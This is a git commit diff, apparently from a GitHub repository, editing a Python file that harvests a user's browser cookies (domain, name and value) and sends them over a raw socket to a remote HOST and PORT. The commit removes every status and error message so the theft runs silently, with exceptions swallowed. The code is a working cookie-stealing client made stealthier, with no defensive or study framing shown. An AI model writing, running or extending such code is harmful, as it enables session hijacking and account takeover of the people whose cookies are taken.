d4fd07738f004e0799d8c10014a976bad724d861
roqols <92282813+roqols@users.noreply.github.com>
2025-08-11 02:07:42 -0300

    Update client.py

--- arq/client.py
+++ arq/client.py
@@ -12,8 +12,7 @@ def coletar_cookies():
         for cookie in cj:
             cookies_str += f"{cookie.domain}\t{cookie.name}\t{cookie.value}\n"
         return cookies_str
-    except Exception as e:
-        print('Erro ao coletar cookies:', e)
+    except Exception:
         return ''
 
 def enviar_cookies(dados):
@@ -21,15 +20,11 @@ def enviar_cookies(dados):
         with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
             s.connect((HOST, PORT))
             s.sendall(dados.encode('utf-8'))
-            print('Cookies enviados com sucesso.')
-    except Exception as e:
-        print('Erro na conexão ou envio:', e)
+    except Exception:
+        pass
 
 if __name__ == '__main__':
     cookies = coletar_cookies()
     if cookies:
         enviar_cookies(cookies)
-    else:
-        print('Nenhum cookie para enviar.')
-    print('Fim do programa. Fechando em 10 segundos...')
     time.sleep(10)
